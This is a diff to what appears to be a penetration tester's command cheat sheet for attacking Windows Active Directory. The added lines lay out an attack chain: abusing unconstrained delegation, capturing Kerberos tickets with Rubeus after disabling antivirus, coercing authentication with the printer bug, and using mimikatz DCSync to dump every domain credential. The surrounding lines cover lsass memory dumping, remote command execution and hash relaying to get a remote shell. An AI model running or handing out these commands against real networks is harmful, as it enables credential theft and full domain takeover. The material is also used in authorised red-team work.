@@ -71,6 +71,20 @@ Enter-PSSession -ComputerName {remote computer name} -Credential {domain or comp
 * `procdump64.exe --accepteula -ma lsass.exe dump.dmp` _Dump lsass memory with procdump.  Will contain password hashes, or clear text if using wdigest flag_
 * `pypykatz.exe lsa minidump dump.dmp` _Extract creds from lsass dump.  Should be done on attacker machine_
 
+* `Get-AdComputer -filter {(TrustedForDelegation -eq $True)}` _Find computers with unconstrained delegation.  If you have local admin on a computer with unconstrained delegation you can capture other accounts TGT and pass them to other machines_
+* `rubeus.exe monitor /interval:5 /nowrap` _On computer with unconstrained delegation listen for TGT. Disable AV first_
+* `MS-RPRN.exe {\\domain controller or other machine} {\\machine running rubeus}` _abuse printer bug from attacker machine to force connections to unconstrained delegation machine_
+* _import and pass the rubeus captured ticket to dump all domain creds. Done on attacker machine_
+```
+rubeus.exe ptt /ticket:{captured base64 encoded ticket}
+klist tickets
+mimikatz.exe
+privilege::debug
+log hashes.txt
+lsadump::dcsync /domain:{AD domain} /all /csv
+```
+* `klist purge` _Delete any imported tickets that are not working correctly_
+
 ## Remote Commands
 * `crackmapexec smb {ip range} -u {username} -p {password} -x {cmd}`  _run command on remote machine using valid creds_
 * `/usr/share/responder/tools/MultiRelay.py -t {ip} -u ALL` _Responder must be running with smb and http off.  This will listen for admin hashes and try to relay them to the specified ip to spawn a remote shell.  SMB signing must be disabled on the target [some instructions here](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)_
